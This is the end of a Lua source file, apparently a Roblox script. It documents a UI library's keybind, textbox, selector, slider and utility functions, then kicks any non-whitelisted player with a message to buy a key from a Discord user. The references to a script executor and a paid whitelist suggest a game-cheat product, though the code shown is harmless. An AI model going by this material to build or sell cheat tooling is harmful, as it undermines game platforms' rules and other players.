    -- / Keybind1:Fire()
    -- fires the keybind function

    -- / Keybind1:SetFunction(function() end)
    -- sets the new keybind function

    __________________________

    -- [Textboxes contain rich text]

    -- / Textbox1:Input("new")
    -- sets the text box's input to something new

    -- / Textbox1:Place("new")
    -- sets the text box's placeholder to something new

    -- / Textbox1:Fire()
    -- fires the textbox function

    -- / Textbox1:SetFunction(function() end)
    -- sets the text boxes new function

    -- / Textbox1:Text("new")
    -- sets the textbox's text to something new

    -- / Textbox1:Hide()
    -- hides the textbox from eye view

    -- / Textbox1:Show()
    -- makes the textbox visible

    -- / Textbox1:Remove()
    -- destroys the textbox

    __________________________

    -- [Selectors contain rich text]

    -- / Selector1:SetFunction(function() end)
    -- sets the selector new function

    -- / Selector1:Text("new")
    -- sets the selector's text to something new

    -- / Selector1:Hide()
    -- hides the selector from eye view

    -- / Selector1:Show()
    -- makes the selector visible

    -- / Selector1:Remove()
    -- destroys the selector

    __________________________

    -- [Sliders contain rich text]

    -- / Slider1:Value(1)
    -- sets the slider new value

    -- / Slider1:SetFunction(function() end)
    -- sets the slider new function

    -- / Slider1:Text("new")
    -- sets the slider's text to something new

    -- / Slider1:Hide()
    -- hides the slider from eye view

    -- / Slider1:Show()
    -- makes the slider visible

    -- / Slider1:Remove()
    -- destroys the slider

    ---------------------------------------------------------------------------------------------------------

    MISC SEMI USELESS DOCS:

    -- / library.rank = ""
    -- returns the rank you choose (default = "private")

    -- / library.fps
    -- returns FPS you're getting in game

    -- / library.version
    -- returns the version of the library

    -- / library.title = ""
    -- returns the title of the library

    -- / library:GetDay("word") -- word, short, month, year
    -- returns the os day

    -- / library:GetTime("24h") -- 24h, 12h, minute, half, second, full, ISO, zone
    -- returns the os time

    -- / library:GetMonth("word") -- word, short, digit
    -- returns the os month

    -- / library:GetWeek("year_S") -- year_S, day, year_M
    -- returns the os week

    -- / library:GetYear("digits") -- digits, full
    -- returns the os year

    -- / library:GetUsername()
    -- returns the localplayers username

    -- / library:GetUserId()
    -- returns the localplayers userid

    -- / library:GetPlaceId()
    -- returns the games place id

    -- / library:GetJobId()
    -- returns the games job id

    -- / library:CheckIfLoaded()
    -- returns true if you're fully loaded

    -- / library:Rejoin()
    -- rejoins the same server as you was in

    -- / library:Copy("stuff")
    -- copies the inputed string

    -- / library:UnlockFps(500) -- only works with synapse
    -- sets the max fps to something you choose
    
    -- / library:PromptDiscord("invite")
    -- invites you to a discord
]]

else

  player:Kick("Not Whitelisted Add Me For Buy Key Freakidann#5818")

end


